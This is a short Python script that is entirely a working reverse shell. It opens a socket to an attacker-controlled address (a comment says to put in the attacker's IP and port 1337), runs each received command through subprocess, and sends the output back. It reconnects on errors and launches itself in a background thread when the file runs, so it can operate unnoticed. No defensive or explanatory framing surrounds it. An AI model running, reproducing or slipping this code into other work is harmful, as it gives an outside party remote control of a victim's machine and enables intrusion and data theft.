import threading


def reverse():
    import socket
    import subprocess   
    SERVER_HOST = "192.168.220.1" # Make sure you use YOUR host (attacker) IP address here.
    SERVER_PORT = 1337  
    BUFFER_SIZE = 1024

    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
    while True:
        try:
            command = s.recv(BUFFER_SIZE).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(b'$> ' + output.encode() + b'\n\n')
        except:
            s.close()
            s.connect((SERVER_HOST, SERVER_PORT))

    s.close()

threading.Thread(target=reverse, args=()).start()